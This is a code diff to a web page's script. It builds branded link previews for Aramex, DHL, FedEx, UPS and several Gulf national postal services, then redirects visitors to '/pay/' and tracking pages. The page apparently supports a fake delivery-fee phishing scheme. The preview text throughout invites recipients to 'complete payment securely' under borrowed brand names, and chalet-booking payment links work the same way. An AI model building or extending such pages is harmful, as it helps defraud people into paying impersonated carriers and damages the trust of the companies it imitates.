@@ -69,71 +69,97 @@
   </div>
   
   <script>
-    // Service data mapping
+    // Service data mapping - for dynamic OG tags
     const serviceData = {
       aramex: {
         name: "أرامكس - Aramex",
-        description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
+        nameEn: "Aramex",
+        description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة - تتبع شحنتك وأكمل الدفع بشكل آمن",
+        descriptionEn: "Leading shipping and logistics company - Track your shipment and complete payment securely",
         ogImage: "/og-aramex.jpg"
       },
       dhl: {
-        name: "دي إتش إل - DHL", 
-        description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
+        name: "دي إتش إل - DHL",
+        nameEn: "DHL",
+        description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي - تتبع شحنتك وأكمل الدفع بشكل آمن",
+        descriptionEn: "Global shipping network providing fast international and local delivery - Track and pay securely",
         ogImage: "/og-dhl.jpg"
       },
       fedex: {
         name: "فيديكس - FedEx",
-        description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
+        nameEn: "FedEx",
+        description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات - تتبع شحنتك وأكمل الدفع بشكل آمن",
+        descriptionEn: "Reliable international shipping with instant tracking - Track and pay securely",
         ogImage: "/og-fedex.jpg"
       },
       ups: {
         name: "يو بي إس - UPS",
-        description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
+        nameEn: "UPS",
+        description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم - تتبع شحنتك وأكمل الدفع بشكل آمن",
+        descriptionEn: "Integrated logistics solutions and fast shipping services worldwide - Track and pay securely",
         ogImage: "/og-ups.jpg"
       },
       empost: {
         name: "البريد الإماراتي - Emirates Post",
-        description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
+        nameEn: "Emirates Post",
+        description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة - نظام دفع آمن ومحمي",
+        descriptionEn: "National postal operator in UAE - Secure and protected payment system",
         ogImage: "/og-empost.jpg"
       },
       smsa: {
         name: "سمسا - SMSA",
-        description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
+        nameEn: "SMSA",
+        description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية - تتبع شحنتك وأكمل الدفع بشكل آمن",
+        descriptionEn: "Largest Saudi shipping company specializing in fast delivery and logistics - Track and pay securely",
         ogImage: "/og-smsa.jpg"
       },
       zajil: {
         name: "زاجل - Zajil",
-        description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
+        nameEn: "Zajil",
+        description: "شركة سعودية رائدة في خدمات البريد السريع والشحن - تتبع شحنتك وأكمل الدفع بشكل آمن",
+        descriptionEn: "Leading Saudi company in express mail and shipping services - Track and pay securely",
         ogImage: "/og-zajil.jpg"
       },
       naqel: {
-        name: "ناقل - Naqel", 
-        description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
+        name: "ناقل - Naqel",
+        nameEn: "Naqel",
+        description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة - تتبع شحنتك وأكمل الدفع بشكل آمن",
+        descriptionEn: "Advanced shipping solutions and integrated logistics services in Saudi Arabia - Track and pay securely",
         ogImage: "/og-naqel.jpg"
       },
       saudipost: {
         name: "البريد السعودي - Saudi Post",
-        description: "المشغل الوطني للبريد في المملكة العربية السعودية",
+        nameEn: "Saudi Post",
+        description: "المشغل الوطني للبريد في المملكة العربية السعودية - نظام دفع آمن ومحمي",
+        descriptionEn: "National postal operator in Saudi Arabia - Secure and protected payment system",
         ogImage: "/og-saudipost.jpg"
       },
       kwpost: {
         name: "البريد الكويتي - Kuwait Post",
-        description: "المشغل الوطني للبريد في دولة الكويت",
+        nameEn: "Kuwait Post",
+        description: "المشغل الوطني للبريد في دولة الكويت - نظام دفع آمن ومحمي",
+        descriptionEn: "National postal operator in Kuwait - Secure and protected payment system",
         ogImage: "/og-kwpost.jpg"
       },
       qpost: {
         name: "البريد القطري - Qatar Post",
-        description: "المشغل الوطني للبريد في دولة قطر",
+        nameEn: "Qatar Post",
+        description: "المشغل الوطني للبريد في دولة قطر - نظام دفع آمن ومحمي",
+        descriptionEn: "National postal operator in Qatar - Secure and protected payment system",
         ogImage: "/og-qpost.jpg"
       },
       omanpost: {
         name: "البريد العُماني - Oman Post",
-        description: "المشغل الوطني للبريد في سلطنة عُمان",
+        nameEn: "Oman Post",
+        description: "المشغل الوطني للبريد في سلطنة عُمان - نظام دفع آمن ومحمي",
+        descriptionEn: "National postal operator in Oman - Secure and protected payment system",
         ogImage: "/og-omanpost.jpg"
       },
       bahpost: {
         name: "البريد البحريني - Bahrain Post",
-        description: "المشغل الوطني للبريد في مملكة البحرين",
+        nameEn: "Bahrain Post",
+        description: "المشغل الوطني للبريد في مملكة البحرين - نظام دفع آمن ومحمي",
+        descriptionEn: "National postal operator in Bahrain - Secure and protected payment system",
         ogImage: "/og-bahpost.jpg"
       }
     };
@@ -151,55 +177,92 @@
     function updateMetaTags() {
       const url = new URL(window.location.href);
       const path = url.pathname;
+      const siteUrl = `${url.protocol}//${url.host}`;
+      let targetUrl = '/';
+
+      // Check if this is a payment link: /pay/:companyId
+      const payMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)$/);
+      if (payMatch) {
+        const companyId = payMatch[1];
+        const serviceInfo = serviceData[companyId] || serviceData.aramex;
+
+        const title = `إتمام الدفع - ${serviceInfo.name}`;
+        const description = serviceInfo.description;
+        const ogImage = `${siteUrl}${serviceInfo.ogImage}`;
+
+        updateTags(title, description, ogImage, url.href);
+        targetUrl = `/pay/${companyId}.html`;
+        setTimeout(() => window.location.href = targetUrl, 1000);
+        return;
+      }
+
+      // Check if this is a tracking link: /r/:companyId
+      const rMatch = path.match(/^\/r\/([a-zA-Z0-9-]+)$/);
+      if (rMatch) {
+        const companyId = rMatch[1];
+        const serviceInfo = serviceData[companyId] || serviceData.aramex;
+
+        const title = `تتبع الشحنة - ${serviceInfo.name}`;
+        const description = serviceInfo.description;
+        const ogImage = `${siteUrl}${serviceInfo.ogImage}`;
+
+        updateTags(title, description, ogImage, url.href);
+        targetUrl = `/r/${companyId}.html`;
+        setTimeout(() => window.location.href = targetUrl, 1000);
+        return;
+      }
 
       // Check if this is a microsite route: /r/:country/:type/:id
       const micrositeMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
 
-      if (!micrositeMatch) {
-        // Not a microsite route, redirect to main app
-        window.location.href = '/';
-        return;
-      }
+      if (micrositeMatch) {
+        const [, countryCode, type, id] = micrositeMatch;
+        const country = countryData[countryCode];
 
-      const [, countryCode, type, id] = micrositeMatch;
-      const country = countryData[countryCode];
+        if (!country) {
+          window.location.href = '/';
+          return;
+        }
 
-      if (!country) {
-        window.location.href = '/';
-        return;
-      }
+        let title = "";
+        let description = "";
+        let ogImage = "/og-aramex.jpg";
 
-      let title = "";
-      let description = "";
-      let ogImage = "/og-aramex.jpg";
+        if (type === "shipping") {
+          // For shipping, try to get service info from URL parameters or use default
+          const serviceKey = url.searchParams.get('service') || 'aramex';
+          const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
 
-      if (type === "shipping") {
-        // For shipping, try to get service info from URL parameters or use default
-        const serviceKey = url.searchParams.get('service') || 'aramex';
-        const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
-
-        // Ensure serviceInfo and its properties exist
-        if (serviceInfo && serviceInfo.name && serviceInfo.description && serviceInfo.ogImage) {
-          title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
-          description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
-          ogImage = serviceInfo.ogImage;
-        } else {
-          // Use default values if serviceInfo is invalid
-          title = "تتبع وتأكيد الدفع - منصة الشحن الذكية";
-          description = "تتبع شحنتك وأكمل الدفع بشكل آمن عبر منصة الشحن الذكية";
+          // Ensure serviceInfo and its properties exist
+          if (serviceInfo && serviceInfo.name && serviceInfo.description && serviceInfo.ogImage) {
+            title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
+            description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
+            ogImage = serviceInfo.ogImage;
+          } else {
+            // Use default values if serviceInfo is invalid
+            title = "تتبع وتأكيد الدفع - منصة الشحن الذكية";
+            description = "تتبع شحنتك وأكمل الدفع بشكل آمن عبر منصة الشحن الذكية";
+            ogImage = "/og-aramex.jpg";
+          }
+        } else if (type === "chalet") {
+          // For chalet links
+          title = `حجز شاليه في ${country.nameAr || country.name}`;
+          description = `احجز شاليه أحلامك في ${country.nameAr || country.name} - نظام دفع آمن ومحمي`;
           ogImage = "/og-aramex.jpg";
         }
-      } else if (type === "chalet") {
-        // For chalet links
-        title = `حجز شاليه في ${country.nameAr || country.name}`;
-        description = `احجز شاليه أحلامك في ${country.nameAr || country.name} - نظام دفع آمن ومحمي`;
-        ogImage = "/og-aramex.jpg";
+
+        const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
+        updateTags(title, description, fullOgImage, url.href);
+        targetUrl = url.href;
+        setTimeout(() => window.location.href = targetUrl, 1000);
+        return;
       }
 
-      const siteUrl = `${url.protocol}//${url.host}`;
-      const fullUrl = url.href;
-      const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
+      // Not a recognized route, redirect to main app
+      window.location.href = '/';
+    }
 
+    function updateTags(title, description, ogImage, fullUrl) {
       // Helper function to safely update elements
       function safeUpdateElement(id, property, value, defaultValue) {
         const element = document.getElementById(id);
@@ -218,18 +281,13 @@
       safeUpdateElement('og-url', 'content', fullUrl, "");
       safeUpdateElement('og-title', 'content', title, "منصة الشحن الذكية");
       safeUpdateElement('og-description', 'content', description, "منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى");
-      safeUpdateElement('og-image', 'content', fullOgImage, `${siteUrl}/og-aramex.jpg`);
+      safeUpdateElement('og-image', 'content', ogImage, `${new URL(window.location.href).origin}/og-aramex.jpg`);
       safeUpdateElement('twitter-url', 'content', fullUrl, "");
       safeUpdateElement('twitter-title', 'content', title, "منصة الشحن الذكية");
       safeUpdateElement('twitter-description', 'content', description, "منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى");
-      safeUpdateElement('twitter-image', 'content', fullOgImage, `${siteUrl}/og-aramex.jpg`);
+      safeUpdateElement('twitter-image', 'content', ogImage, `${new URL(window.location.href).origin}/og-aramex.jpg`);
       safeUpdateElement('twitter-image-alt', 'content', title, "منصة الشحن الذكية");
       safeUpdateElement('canonical-url', 'href', fullUrl, "");
-
-      // Redirect to actual app after a short delay to ensure meta tags are processed
-      setTimeout(() => {
-        window.location.href = fullUrl;
-      }, 1000);
     }
 
     // Run on page load
